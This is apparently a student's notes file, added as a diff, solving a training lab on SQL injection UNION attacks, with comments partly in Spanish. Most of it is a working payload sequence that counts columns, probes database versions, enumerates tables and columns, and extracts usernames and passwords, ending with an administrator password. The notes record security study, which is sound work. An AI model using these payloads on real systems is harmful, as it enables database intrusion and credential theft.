@@ -1,0 +1,11 @@
+Lab: SQL injection UNION attack, retrieving data from other tables
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+
+' order by 2-- VEMOS EL NUMERO DE COLS ES 2
+' UNION SELECT NULL,version FROM v$instance-- --> ERROR
+' UNION SELECT NULL, @@version-- --> ERROR
+' UNION SELECT NULL, version()-- --> bingo PostgreSQL 12.22
+' UNION SELECT NULL, table_name FROM information_schema.tables -- vemos una tabla llamada users
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'-- retorna username email y password
+' UNION SELECT username, password from users--  administrator  ae7b5l1vm0hg8r5xg61l
